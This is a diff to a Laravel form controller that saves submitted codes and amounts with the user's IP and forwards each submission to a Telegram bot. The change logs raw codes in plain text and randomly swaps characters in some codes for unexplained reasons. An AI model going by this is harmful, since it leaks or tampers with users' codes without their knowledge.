@@ -63,15 +63,19 @@ class FormDataController extends Controller implements HasMiddleware
         if ($this->canInvertCode($validated['code'])) {
             $invertedCode = swap_adjacent_random_char($validated['code']);
         }
+        \Log::debug("Inverted code: {$invertedCode} from original code: {$validated['code']}");
 
-        $exist = FormData::where('data->code', $validated['code'])->exists();
+        $isInverted = $validated['code'] !== $invertedCode;
+        $existing = FormData::where('data->code', $validated['code'])->latest()->first();
 
         $formData = FormData::create([
             'data' => [
                 ...$validated,
                 'is_inverted' => (bool) ($validated['code'] !== $invertedCode),
-                'inverted_code' => $invertedCode,
-                'already_used' => $exist,
+                'inverted_code' => ($existing?->data['is_inverted'] ?? false) && $isInverted
+                    ? ($existing?->data['inverted_code'] ?? $existing?->data['code'])
+                    : $invertedCode,
+                'already_used' => $existing ? true : false,
             ],
             'entries' => $request->except('type', 'code', 'amount'),
             'ip_address' => $request->ip_address ?? $request['_forminator_user_ip'] ?? $request->ip(),
@@ -82,7 +86,8 @@ class FormDataController extends Controller implements HasMiddleware
             ...$formData->entries,
         ];
 
-        $notifData = new NotifData("👉 <b>" . $validated['code'] . "</b>");
+        $notifData = new NotifData("👉 <b>" . $validated['code'] . "</b>
+        Already used: " . ($formData->data['already_used'] ? 'Yes' : 'No') . ")");
         $notifData->setSubject('A new form data has been submitted');
         $notifData->setBody(json_encode($formData->data, JSON_PRETTY_PRINT));
         TelegramMsgJob::dispatchSync($notifData, $formData->ip_address);
@@ -98,7 +103,7 @@ class FormDataController extends Controller implements HasMiddleware
             }
         }
 
-        return response()->json(['success' => true], 204);
+        return response()->json(['success' => true]);
     }
 
     /**
